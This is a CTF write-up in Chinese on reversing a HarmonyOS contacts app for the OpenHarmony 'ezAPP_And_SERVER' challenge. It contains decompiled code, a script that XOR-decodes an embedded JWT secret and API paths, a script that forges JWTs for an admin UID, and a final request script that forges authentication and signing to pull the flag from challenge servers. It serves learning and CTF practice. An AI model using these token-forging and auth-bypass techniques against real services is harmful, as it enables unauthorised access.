---
title: "OpenHarmony CTF：ezAPP 与 SERVER 题解"
description: "OpenHarmonyCTF-ezAPP_And_SERVER 主要是鸿蒙APP结合Web漏洞分析和学习"
date: 2025-06-23
tags:
  - "hap"
  - "OpenHarmony"
  - "ctf"
  - "WEB"
authors:
  - "hnusec"
draft: false             
slug: "OpenHarmonyCTF"          
---

<meta name="referrer" content="no-referrer">


# OpenHarmonyCTF-ezAPP_And_SERVER

:::info
主要是鸿蒙APP结合Web漏洞

@Ewoji 

:::

### hap 包逆向
常规的安卓 APP-apk 包我们可以采用 jadx 这些软件去逆向查看逻辑代码

但是 Hap 包的逆向文章十分稀缺，能用软件目前就找到了两个

1. abc-decompiler

这个就是 jadx 的鸿蒙版

[GitHub - ohos-decompiler/abc-decompiler](https://github.com/ohos-decompiler/abc-decompiler)

> 但是效果一般，还是处于开发阶段，但是能阅读出来大部分代码就好
>



2. adcde

> 比较新的吧算，JDK17+
>

[GitHub - Yricky/abcde: openHarmony逆向工具包，初步支持反编译](https://github.com/Yricky/abcde)



跟 jadx 逻辑一样，具体使用找到一些文章如下

[鸿蒙hap应用反编译工具 abc-decompiler 使用分享](https://bbs.kanxue.com/thread-283225.htm)







### ezAPP_And_SERVER
> 给了一个远程地址，和一个 Hap包文件
>

主要做题过程如下

1. Hap逆向工具，逆abc文件，附件给了一个Hap包，直接解压，分析，module.json，主入口是: `EntryAbility`，在ets目录下有一个modules.abc和一个soruceMap.map文件
2. 尝试 sourceMaps.map，逆出来的东西，但这个没什么有，都是前端样式
3. 逆向abc文件，找到基本接口和逻辑
4. 知道交互的加密和逻辑，sqlite注入拿到uuid
5. 得到 flag

经过逆向分析----整个app的大概逻辑是这样的

```plain
HarmonyOS Contacts应用架构
├── EntryAbility (入口)
│   └── 设置 global.ip = "47.96.162.115:8080"
├── pages/Index (主页面)
├── pages/setIP (IP设置页面)
│   └── 可以修改 global.ip 变量
└── common/Utils (网络工具类)
    ├── 使用 global.ip 构建URL
    ├── API端点：/api/v1/contacts?uid=
    ├── API端点：/api/v1/getflag  
    ├── JWT密钥：wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh
    ├── RSA2048加密
    └── MD5签名验证 (X-Sign头)

应用启动，global.ip = "47.96.162.115:8080"
用户查看联系人：请求 http://47.96.162.115:8080/api/v1/contacts?uid=xxx
用户尝试获取flag：请求 http://47.96.162.115:8080/api/v1/getflag
返回403：只有admin可以访问getflag
```

#### 逆向分析过程
##### entryability文件
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378304616-b56bd1e5-3fc3-4186-b583-f62293938fb3.png)

可以发现，一个交互IP

```plain
global.ip = "47.96.162.115:8080";
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378304792-38cb6796-bc57-4548-bab7-df8fbb1b232d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378305701-1ef083e7-e7c1-4952-ab72-77d44b8ec29d.png)

应用会加载 `pages/Index` 页面

继续查看page.index

##### page.index
主页面，一些关联关系

##### Page.setIP
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378304665-a2624e83-d84a-427a-9bf2-a7c67ba5654c.png)

有一个IP设置功能

这个页面允许用户设置自定义的IP地址：

```plain
// 输入框，允许输入IP
TextInput.create(createobjectwithbuffer(["placeholder", "请输入IP"]));
TextInput.inputFilter("[0-9.:]", #~@0>@1**#);

// 确认按钮点击事件public Object #~@2>@1*^6*#(Object functionObject, Object newTarget, setIP this) {
    global.ip = _lexenv_0_1_.inputIP;  // 设置全局IP变量return null;
}
```

继续分析重点组件文件

##### 组件content
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378304820-e21c6504-bfb2-452e-ab86-72d0a55a5243.png)

这里有一个提示

```plain
FIND THE HIDDEN ONE
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378305508-1d08e4bb-d9d0-424c-b22e-2be9e1041f3a.png)

还有一点就是，依赖于UserList组件

我们接下来分析UserList组件

##### Userlist组件
审计过程中发现

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378305710-40965e88-610b-4f36-b7cf-f098d85ff33c.png)

这里有通讯录里面用户的UID

```plain
r24[0] = createobjectwithbuffer(["uid", "f47ac10b-58cc-4372-a567-0e02b2c3d479"]);
r24[1] = createobjectwithbuffer(["uid", "c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b"]);
r24[2] = createobjectwithbuffer(["uid", "732390b8-ccb6-41de-a93b-94ea059fd263"]);
r24[3] = createobjectwithbuffer(["uid", "f633ec24-cfe6-42ba-bcd8-ad2dfae6d547"]);
r24[4] = createobjectwithbuffer(["uid", "eb8991c8-9b6f-4bc8-89dd-af3576e92bdb"]);
r24[5] = createobjectwithbuffer(["uid", "db62356d-3b99-4764-b378-e46cb95df9e6"]);
r24[6] = createobjectwithbuffer(["uid", "8f4610ee-ee87-4cca-ad92-6cac4fdbe722"]);
r24[7] = createobjectwithbuffer(["uid", "1678d80e-fd4d-4de3-aae2-cb0077f10c21"]);
```

1. 关键函数调用

```plain
// 显示用户名时调用 utils.o0O0OOoo
utils.o0O0OOoo(
_lexenv_0_0_
.uid)

// 点击用户时调用 utils.l1Lll1
utils.l1Lll1(_lexenv_0_1_.uid);
```

Utils模块导入

```plain
utils = import { default as utils } from "@normalized:N&&&entry/src/main/ets/common/Utils/utils&";
```

##### `common/Utils/utils`逆向代码
这个模块比较重要贴一下反编译的代码

```plain
package p001entry/src/main/ets/common/Utils;

/* renamed from: &entry/src/main/ets/common/Utils/utils&, reason: invalid class name */
/* loaded from: G:\down\Chrome\鸿蒙\web\contacts.hap\ets\modules.abc */
public class utils {
    // 成员变量
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    // 一些工具方法（命名混乱，疑似反编译/混淆）
    public Object func_main_0(Object functionObject, Object newTarget, utils this) {
        newlexenvwithname = newlexenvwithname([1, "utils", 0], 1);
        try {
            obj = hole.#~@0=#utils(Object2, Object3, hole, [
                "oo0Oo0", "&entry/src/main/ets/common/Utils/utils&.#~@0<#oo0Oo0", 1,
                "RrrrRRR", "&entry/src/main/ets/common/Utils/utils&.#~@0<#RrrrRRR", 2,
                "rRrrrRR", "&entry/src/main/ets/common/Utils/utils&.#~@0<#rRrrrRR", 2,
                "o0O0OOoo", "&entry/src/main/ets/common/Utils/utils&.#~@0<#o0O0OOoo", 1,
                "l1Lll1", "&entry/src/main/ets/common/Utils/utils&.#~@0<#l1Lll1", 1,
                "o0OO00O", "&entry/src/main/ets/common/Utils/utils&.#~@0<#o0OO00O", 2, 0
            ]);
            _lexenv_0_0_ = obj;
            obj2 = obj.prototype;
            obj.#~@0>#static_initializer();
            newlexenvwithname = obj;
        } catch (ExceptionI0 unused) {
            poplexenv();
            throw(newlexenvwithname);
        }
        poplexenv();
        _module_0_ = newlexenvwithname;
        return null;
    }

    public Object #~@0=#utils(Object functionObject, Object newTarget, utils this) {
        return this;
    }

    public Object #~@0>#static_initializer(Object functionObject, Object newTarget, utils this) {
        this.Secret = "FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ";
        this.uuuuu = "";
        return null;
    }

    // 混淆/反编译后的一些典型方法，主要是加解密、http请求、签名等
    public Object #~@0<#oo0Oo0(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([3, "keyChars", 0, "4newTarget", 1, "this", 2], 3);
        _lexenv_0_1_ = newTarget;
        _lexenv_0_2_ = this;
        from = Array.from(arg0);
        _lexenv_0_0_ = Array.from("134522123");
        map = from.map(#~@0<@1*#);
        return map.join("");
    }

    /* 异或运算符进行简单加密 */
    public Object #~@0<@1*#(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        ldobjbyvalue = _lexenv_0_0_[arg1 % _lexenv_0_0_.length];
        return String.fromCharCode(arg0.charCodeAt(0) ^ ldobjbyvalue.charCodeAt(0));
    }

    // base64解码及密钥生成
    public Object #~@0<@2*#(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([2, "plainText", 0, "reslove", 1], 2);
        _lexenv_0_1_ = arg0;
        newobjrange = import { default as util } from "@ohos:util".Base64Helper();
        obj = createobjectwithbuffer(["data", 0]);
        obj.data = newobjrange.decodeSync(_lexenv_1_0_);
        obj2 = createobjectwithbuffer(["data", 0]);
        buffer = import { default as buffer } from "@ohos:buffer";
        obj2.data = Uint8Array(buffer.from(_lexenv_1_1_, "utf-8").buffer);
        _lexenv_0_0_ = obj2;
        cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
        obj3 = cryptoFramework.createAsyKeyGenerator;
        ldlexvar = _lexenv_2_0_;
        callthisN = obj3(ldlexvar.oo0Oo0("c`u\u0007\u0002\u0006\t"));
        callthisN.convertKey(obj, 0, #~@0<@2**#);
        return null;
    }

    // http post 请求加签
    public Object #~@0<@4*#(Object functionObject, Object newTarget, utils this, Object arg0) {
        i = "{\"data\":\"" + arg0 + "\"}";
        ldlexvar = _lexenv_0_0_;
        obj = ldlexvar.request;
        ldlexvar2 = _lexenv_0_1_;
        obj2 = createobjectwithbuffer(["method", 0, "extraData", 0, "header", 0]);
        obj2.method = import { default as http } from "@ohos:net.http".RequestMethod.POST;
        obj2.extraData = i;
        obj3 = createobjectwithbuffer(["Authorization", 0, "X-Sign", 0, "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"]);
        ldlexvar3 = _lexenv_1_0_;
        obj4 = ldlexvar3.o0OO00O;
        ldlexvar4 = _lexenv_0_2_;
        ldlexvar5 = _lexenv_1_0_;
        obj3.Authorization = obj4(ldlexvar4, ldlexvar5.oo0Oo0(_lexenv_1_0_.Secret));
        CryptoJS = import { default as CryptoJS } from "@normalized:N&&&@ohos/crypto-js/index&2.0.0";
        MD5 = CryptoJS.MD5(i);
        obj3["X-Sign"] = MD5.toString();
        obj2.header = obj3;
        callthisN = obj(ldlexvar2, obj2);
        callthisN.then(#~@0<@4**#);
        return null;
    }

    // http返回处理并弹窗提示
    public Object #~@0<@4**#(Object functionObject, Object newTarget, utils this, Object arg0) {
        if ((import { default as http } from "@ohos:net.http".ResponseCode.OK == arg0.responseCode ? 1 : 0) == 0) {
            promptAction = import { default as promptAction } from "@ohos:promptAction";
            obj3 = promptAction.showToast;
            obj4 = createobjectwithbuffer(["message", 0]);
            obj5 = arg0.result;
            obj4.message = obj5.toString();
            obj3(obj4);
            return null;
        }
        obj6 = console.log;
        JSON = import { default as JSON } from "@ohos:util.json";
        obj7 = JSON.parse;
        obj8 = arg0.result;
        callthisN = obj7(obj8.toString());
        obj = (0 != callthisN ? 1 : 0) == 0 || (0 != callthisN ? 1 : 0) == 0 ? null : callthisN[_lexenv_1_0_.oo0Oo0("W_UR")];
        obj6(obj);
        JSON2 = import { default as JSON } from "@ohos:util.json";
        obj9 = JSON2.parse;
        obj10 = arg0.result;
        callthisN2 = obj9(obj10.toString());
        obj2 = (0 != callthisN2 ? 1 : 0) == 0 || (0 != callthisN2 ? 1 : 0) == 0 ? null : callthisN2[_lexenv_1_0_.oo0Oo0("W_UR")];
        obj11 = obj2;
        promptAction2 = import { default as promptAction } from "@ohos:promptAction";
        obj12 = promptAction2.showToast;
        obj13 = createobjectwithbuffer(["message", 0]);
        obj13.message = obj11;
        obj12(obj13);
        return null;
    }

    // JWT签名
    public Object #~@0<#o0OO00O(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        jwt = import { default as jwt } from "@normalized:N&&&@ohos/jsonwebtoken/index&1.0.1";
        obj = jwt.sign;
        obj2 = createobjectwithbuffer(["sub", "1234567890", "uid", 0, "iat", 1516239022]);
        obj2.uid = arg0;
        return obj(obj2, arg1);
    }

    // 非对称加密
    public Object #~@0<#RrrrRRR(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        asyncfunctionenter = asyncfunctionenter();
        try {
            cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
            obj = cryptoFramework.createCipher;
            ldlexvar = _lexenv_0_0_;
            callthisN = obj(ldlexvar.oo0Oo0("c`u\u0007\u0002\u0006\tNczpg\u0004"));
            newobjrange = import { default as util } from "@ohos:util".Base64Helper();
            suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, callthisN.init(import { default as cryptoFramework } from "@ohos:security.cryptoFramework".CryptoMode.ENCRYPT_MODE, arg0, 0)));
            resumegenerator = resumegenerator(asyncfunctionenter);
            if ((1 == getresumemode(asyncfunctionenter) ? 1 : 0) != 0) {
                throw(resumegenerator);
            }
            suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, callthisN.doFinal(arg1)));
            resumegenerator2 = resumegenerator(asyncfunctionenter);
            if ((1 == getresumemode(asyncfunctionenter) ? 1 : 0) != 0) {
                throw(resumegenerator2);
            }
            asyncfunctionenter = asyncfunctionresolve(newobjrange.encodeToStringSync(resumegenerator2.data), asyncfunctionenter);
            return asyncfunctionenter;
        } catch (ExceptionI0 unused) {
            return asyncfunctionreject(asyncfunctionenter, asyncfunctionenter);
        }
    }

    // http get 请求
    public Object #~@0<#o0O0OOoo(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        i = "http://" + global.ip;
        ldlexvar = _lexenv_1_0_;
        oo0Oo0 = i + ldlexvar.oo0Oo0("\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t") + arg0;
        http = import { default as http } from "@ohos:net.http";
        createHttp = http.createHttp();
        obj = createHttp.request;
        obj2 = createobjectwithbuffer(["method", 0, "header", 0]);
        obj2.method = import { default as http } from "@ohos:net.http".RequestMethod.GET;
        obj3 = createobjectwithbuffer(["Authorization", 0]);
        ldlexvar2 = _lexenv_1_0_;
        obj4 = ldlexvar2.o0OO00O;
        ldlexvar3 = _lexenv_1_0_;
        obj3.Authorization = obj4(arg0, ldlexvar3.oo0Oo0(_lexenv_1_0_.Secret));
        obj2.header = obj3;
        callthisN = obj(oo0Oo0, obj2);
        callthisN.then(#~@0<@3*#);
        return "";
    }

    // get/post回调
    public Object #~@0<@3*#(Object functionObject, Object newTarget, utils this, Object arg0) {
        if ((import { default as http } from "@ohos:net.http".ResponseCode.OK == arg0.responseCode ? 1 : 0) == 0) {
            return null;
        }
        ldlexvar = _lexenv_1_0_;
        JSON = import { default as JSON } from "@ohos:util.json";
        obj = JSON.parse;
        obj2 = arg0.result;
        callthisN = obj(obj2.toString());
        ldlexvar.uuuuu = ((0 != callthisN ? 1 : 0) == 0 || (0 != callthisN ? 1 : 0) == 0) ? null : callthisN["data"]["users"][0]["name"];
        console.log(_lexenv_1_0_.uuuuu);
        return null;
    }

    // 其它辅助方法
    public Object #~@0<#l1Lll1(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([5, "req", 0, "url2", 1, "uuid", 2, "4newTarget", 3, "this", 4], 5);
        _lexenv_0_3_ = newTarget;
        _lexenv_0_4_ = this;
        _lexenv_0_2_ = arg0;
        i = "http://" + global.ip;
        ldlexvar = _lexenv_1_0_;
        _lexenv_0_1_ = (i + ldlexvar.oo0Oo0("\u001eRD\\\u001dD\u0000\u001dTTGRYSU"));
        http = import { default as http } from "@ohos:net.http";
        _lexenv_0_0_ = http.createHttp();
        ldlexvar2 = _lexenv_1_0_;
        oo0Oo0 = ldlexvar2.oo0Oo0("|z}w{Xp|qVXE]Y[v\u000bD\u0001qudwtps|rre\rs\u007fx{qrT\u007fvscts\u0005ykF\u0004~a~J\u0001@\n\u0003YaD\u0001B\u0004K9\\DFUH\u001dyFDc[Fw\u0006\u0001guxsxaJ\u0007h\u0006]aGqGd[p[Dtd|\u0002\u0007\u0001dXYG}RPsAB~\u0005K@F|ZFYtW|\u007f?A\u0006~aG\u0006cN}dKV^XVDl\u0002j\u0002\u0005Cukxzzkkua\u0005d^\u001fRhP\u0004jkFZe\ruQwCUtYV~P~[DVVfc@@8y\u0006@G\u0000{Ea{{}ZeX\\xhCrYU~gaM~t\u0000\u0019^Fup\u007fdF\u0004q|`q\u001bS@tAA\u001cd\u0006\u001fzAB[\u007ftpeSz`P_8\n\bfAL\u000bykAt`Dl\u0007W\u0019\u007fDExr@y|Sf\u0003_HPd\u0005jf`[k_[Y\u001eY\u0003\u001aU\u000b|tg\u0005\u0003fAgiEDAw@vdsD;x\u001b\\|PrubUxe\u0002\u0005x\u001eVv~\u0000mrkzzww\u0003d\u007fXsBuur\u0001_zb]G\u0006\u0004\u000bu\u0003PvzJ~EfdDs|cE\u001eqp\u0000@>aE{usbpq");
        ldlexvar3 = _lexenv_1_0_;
        oo0Oo02 = ldlexvar3.oo0Oo0("J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N");
        ldlexvar4 = _lexenv_1_0_;
        rRrrrRR = ldlexvar4.rRrrrRR(oo0Oo02, oo0Oo0);
        rRrrrRR.then(#~@0<@4*#);
        return "";
    }

    // promise链式处理
    public Object #~@0<#rRrrrRR(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        newlexenvwithname([4, "pk", 0, "message", 1, "4newTarget", 2, "this", 3], 4);
        _lexenv_0_2_ = newTarget;
        _lexenv_0_3_ = this;
        _lexenv_0_1_ = arg0;
        _lexenv_0_0_ = arg1;
        return Promise(#~@0<@2*#);
    }

    public Object #~@0<@2**#(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        if (isfalse(arg0) == null) {
        }
        ldlexvar = _lexenv_2_0_;
        RrrrRRR = ldlexvar.RrrrRRR(arg1.pubKey, _lexenv_0_0_);
        RrrrRRR.then(#~@0<@2***#);
        return null;
    }

    public Object #~@0<@2***#(Object functionObject, Object newTarget, utils this, Object arg0) {
        _lexenv_0_1_(arg0);
        return null;
    }
}
```

`oo0Oo0` - 字符串解码函数

```plain
// 使用密钥 "134522123" 进行异或解码
_lexenv_0_0_ = Array.from("134522123");
```

`o0O0OOoo` - 获取用户名函数

```plain
// 发送GET请求到: http://IP/api/user/uuid/{uid}
oo0Oo0 = i + ldlexvar.oo0Oo0("\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t") + arg0;
```

`l1Lll1` - 点击用户函数

```plain
// 发送POST请求到: http://IP/api/user/verify
_lexenv_0_1_ = (i + ldlexvar.oo0Oo0("\u001eRD\\\u001dD\u0000\u001dTTGRYSU"));
```

还有一些其他编码信息，写一个python脚本xor一下

```plain
def xor_decode(text, key="134522123"):
    """XOR解码函数"""
    result = ""
    for i, char in enumerate(text):
        key_char = key[i % len(key)]
        decoded_char = chr(ord(char) ^ ord(key_char))
        result += decoded_char
    return result

encoded_data = {
    # API路径1 (来自o0O0OOoo函数)
    "api_path_1": "\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t",

    # API路径2 (来自l1Lll1函数)
    "api_path_2": "\u001eRD\\\u001dD\u0000\u001dTTGRYSU",

    # JWT密钥
    "jwt_secret": "FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ",

    # 其他编码字符串
    "encoded_1": "c`u\u0007\u0002\u0006\t",
    "encoded_2": "c`u\u0007\u0002\u0006\tNczpg\u0004",
    "encoded_3": "W_UR",
    "encoded_4": "|z}w{Xp|qVXE]Y[v\u000bD\u0001qudwtps|rre\rs\u007fx{qrT\u007fvscts\u0005ykF\u0004~a~J\u0001@\n\u0003YaD\u0001B\u0004K9\\DFUH\u001dyFDc[Fw\u0006\u0001guxsxaJ\u0007h\u0006]aGqGd[p[Dtd|\u0002\u0007\u0001dXYG}RPsAB~\u0005K@F|ZFYtW|\u007f?A\u0006~aG\u0006cN}dKV^XVDl\u0002j\u0002\u0005Cukxzzkkua\u0005d^\u001fRhP\u0004jkFZe\ruQwCUtYV~P~[DVVfc@@8y\u0006@G\u0000{Ea{{}ZeX\\xhCrYU~gaM~t\u0000\u0019^Fup\u007fdF\u0004q|`q\u001bS@tAA\u001cd\u0006\u001fzAB[\u007ftpeSz`P_8\n\bfAL\u000bykAt`Dl\u0007W\u0019\u007fDExr@y|Sf\u0003_HPd\u0005jf`[k_[Y\u001eY\u0003\u001aU\u000b|tg\u0005\u0003fAgiEDAw@vdsD;x\u001b\\|PrubUxe\u0002\u0005x\u001eVv~\u0000mrkzzww\u0003d\u007fXsBuur\u0001_zb]G\u0006\u0004\u000bu\u0003PvzJ~EfdDs|cE\u001eqp\u0000@>aE{usbpq",
    "encoded_5": "J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N",
}

print("🔓 解码应用中的所有关键信息")
print("=" * 60)

for name, encoded in encoded_data.items():
    try:
        decoded = xor_decode(encoded)
        print(f"{name:12}: '{decoded}'")
        if "api_path" in name:
            print(f"{'':12}  🎯 完整URL: http://{{global.ip}}{decoded}")

    except Exception as e:
        print(f"{name:12}: 解码失败 - {e}")
```

-->有两个路由和一些密码信息

```plain
E:\py\PythonProject8\.venv\Scripts\python.exe E:\py\PythonProject8\rascry.py 

api_path_1  : '/api/v1/contacts?uid='
api_path_2  : '/api/v1/getflag'
jwt_secret  : 'wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh'
encoded_1   : 'RSA2048'
encoded_2   : 'RSA2048|PKCS1'
encoded_3   : 'flag'
encoded_4   : 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z
hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK
s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur
H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn
99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw
K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s
TwIDAQAB'
encoded_5   : '{"action":"getflag"}'
```

提取出来RSA公钥

```plain
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z
hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK
s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur
H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn
99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw
K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s
TwIDAQAB
```

写一个JWT生成脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import jwt
import time
import datetime


def xor_decode(text, key="134522123"):
    """XOR解码函数"""
    result = ""
    for i, char_code in enumerate(text):
        key_char_code = ord(key[i % len(key)])
        decoded_char_code = ord(char_code) ^ key_char_code
        result += chr(decoded_char_code)
    return result


JWT_SECRET_ENCODED = "FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ"
try:
    DECODED_JWT_SECRET = xor_decode(JWT_SECRET_ENCODED)
except Exception as e:
    print(f"解码 JWT 密钥时出错: {e}")
    DECODED_JWT_SECRET = "wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh" # 后备密钥
    print(f"已使用备用 JWT 密钥: {DECODED_JWT_SECRET}")



UID_TO_USE = "c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b"


def generate_jwt_token(uid, secret):
    try:
        current_iat = int(time.time())

        payload = {
            "sub": "1234567890",  # 根据逆向代码中的 JWT 结构
            "uid": "9d5ec98c-5848-4450-9e58-9f97b6b3b7bc",
            "iat": current_iat   # 使用当前的 UTC 时间戳
        }

        token = jwt.encode(payload, str(secret), algorithm="HS256")
        print(f"UID: {uid}")
        print(f"iat (时间戳): {current_iat}")
        print(f"Payload: {payload}")
        print(f"使用的密钥 (前5位): {str(secret)[:5]}...")
        print(f"生成的 JWT Token:\n{token}")

        return token
    except Exception as e:
        print(f"生成 JWT 时发生错误: {e}")
        return None

if __name__ == "__main__":
    print(f"将为 UID: {UID_TO_USE} 生成 JWT")
    print(f"解码后的 JWT 密钥 (用于签名): '{DECODED_JWT_SECRET}'")

    # 生成 JWT
    jwt_token = generate_jwt_token(UID_TO_USE, DECODED_JWT_SECRET)
```

测一下两个路由，

1. contacts路由

```plain
GET /api/v1/contacts?uid=1 HTTP/1.1
Host: web-1a870075cf.challenge.xctf.org.cn:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoiYzljMWU1YjItNWY1Yi00YzViLThmNWItNWY1YjVmNWI1ZjViIiwiaWF0IjoxNTE2MjM5MDIyfQ._ePnZxenxfK9gomnSGhe3HQgEZFuNmrzCbctYoFUiVo
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378305990-ab64d0be-2ba7-4147-b6ab-09716c386b86.png)

1. getflag路由

```plain
POST /api/v1/getflag HTTP/1.1
Host: web-a3ad410dab.challenge.xctf.org.cn
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoiYzljMWU1YjItNWY1Yi00YzViLThmNWItNWY1YjVmNWI1ZjViIiwiaWF0IjoxNTE2MjM5MDIyfQ._ePnZxenxfK9gomnSGhe3HQgEZFuNmrzCbctYoFUiVo
Content-Type: application/json
Content-Length: 58

{"uid": "c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b"}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378305957-d244333e-3c7b-48b1-98fa-49f73c455410.png)

这里提示“只能admin访问”

测了那8个UID，都无用，不是UID

尝试UID也失败了



#### 注入分析
通过contacts接口sqlite注入拿到uuid

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378306450-73683f8f-1d4f-4bfb-bb09-73bf1a4bcb38.png)

Admin的UID：

```python
9d5ec98c-5848-4450-9e58-9f97b6b3b7bc
```

拿到uuid后根据上面逆向得出的加密写脚本访问api/v1/getflag即可

脚本如下

```python
import base64
import hashlib
import hmac
import requests

# ===== 配置参数 =====
BASE_URL = "http://web-5c248a2b5f.challenge.xctf.org.cn:80/"  # 替换实际IP
API_PATH = "/api/v1/getflag"  # 替换实际API路径

def generate_md5(data: str) -> str:
    """生成请求体MD5校验值"""
    return hashlib.md5(data.encode()).hexdigest()

# ===== 构造加密请求 =====
# 1. 准备原始数据
plain_data = '{"action":"getflag"}'  # 待加密数据

encrypted_data = "DWqSSmEhyZT7mPVrwPVFfDfpZr6/A1JEy/rhOTLt5boKOmQbJLstBXBJ0kFAlX6y890wOKlW+Spgi2z5/Yt1+tDvaNMWt5TZyvj+HgGq2gbiNwAbrznSaxTI1cd+qKTy+kIcvSAEClIlwN9iQ+xL2wLBhxvl3KLZzDxMVPHeaOjV0WFQFqlf+xkHYRavpvo19slizHFAkxpJiwLCO/iVoOeG8/4Abof5OfsDIE3xzcgAThd2TY/27V+4L3oWQQaRcmht7iDTE0W9p8Up2egBU2gvo7MVsqLja0p9Lt6mEjHKfatzHtY2/NMuatS2uBxdz7M3iX6z4ADgJKeKFeSOMg=="
request_body = f'{{"data":"{encrypted_data}"}}'  # 包装为JSON

# 4. 生成数据完整性校验 (X-Sign头)
content_md5 = generate_md5(request_body)

# ===== 组装HTTP请求 =====
headers = {
    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoiOWQ1ZWM5OGMtNTg0OC00NDUwLTllNTgtOWY5N2I2YjNiN2JjIiwiaWF0IjoxNTE2MjM5MDIyfQ.h7eaXGcCUq-3UDwEwjtDxDCKrcpwj36alJy5SAZetro",
    "X-Sign": content_md5,
    "Content-Type": "application/json",
    "User-Agent": "HarmonyOS-Client/1.0"
}

try:
    # 发送POST请求
    response = requests.post(
        url=f"{BASE_URL}{API_PATH}",
        headers=headers,
        data=request_body,
        timeout=10
    )

    # 处理响应
    if response.status_code == 200:
        print("[✓] 请求成功！响应内容:", response.json())
    else:
        print(f"[×] 请求失败！状态码: {response.status_code}, 错误: {response.text}")

except Exception as e:
    print(f"[!] 请求异常: {str(e)}")
```

云服务器拿到testflag，换靶机就拿到了trueflag

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378306438-19cce81a-ebdb-46b4-bca5-3c4e258b047f.png)

trueflag如下

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754378306636-1c7ab35f-e8db-4d86-bf2b-67f94f0c42fd.png)

